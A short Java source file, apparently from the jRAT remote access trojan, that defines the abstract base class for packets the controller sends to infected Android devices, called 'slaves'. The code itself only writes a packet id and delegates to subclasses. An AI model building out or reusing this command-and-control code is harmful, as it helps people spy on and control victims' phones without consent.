package jrat.controller.packets.android.outgoing;

import jrat.controller.android.AndroidSlave;

import java.io.DataOutputStream;


public abstract class AbstractOutgoingAndroidPacket {

	public abstract void write(AndroidSlave slave, DataOutputStream dos) throws Exception;

	public abstract byte getPacketId();

	public synchronized final void send(AndroidSlave slave, DataOutputStream dos) {
		try {
			byte id = getPacketId();

			dos.writeByte(getPacketId());
			this.write(slave, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
